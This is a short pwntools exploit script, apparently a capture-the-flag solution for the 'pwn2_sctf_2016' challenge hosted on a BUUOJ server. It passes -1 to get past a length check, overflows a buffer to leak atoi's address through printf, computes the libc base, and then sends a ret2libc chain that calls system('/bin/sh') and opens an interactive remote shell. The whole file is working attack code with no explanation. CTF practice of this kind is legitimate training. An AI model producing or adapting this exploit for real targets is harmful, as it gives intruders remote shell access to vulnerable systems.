from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',28619)
elf=ELF("pwn2_sctf_2016")
libc=ELF("libc-2.23.so")
p.sendlineafter("read?",b'-1')

esi_edi_ebp=0x0804864d
atoi_got=elf.got["atoi"]
printf_plt=elf.plt["printf"]

format_str=0x080486F8
main_addr=elf.sym["main"]

payload=(0x2c+4)*b'a'+      p32(printf_plt)     +p32(main_addr)     +p32(format_str)        +p32(atoi_got)
p.sendlineafter("data!",payload)
atoi_addr=u32(p.recvuntil("\xf7")[-4:])
print(hex(atoi_addr))
libc_base=atoi_addr-libc.sym["atoi"]
system_addr=libc_base+libc.sym["system"]
bin_sh=libc_base+next(libc.search(b'/bin/sh'))
ret=0x08048346
p.sendlineafter("read?",b'-1')
payload_=(0x2c+4)*b'a'+p32(ret)+p32(system_addr)+p32(main_addr)+p32(bin_sh)
p.sendlineafter("data!",payload_)
p.interactive()






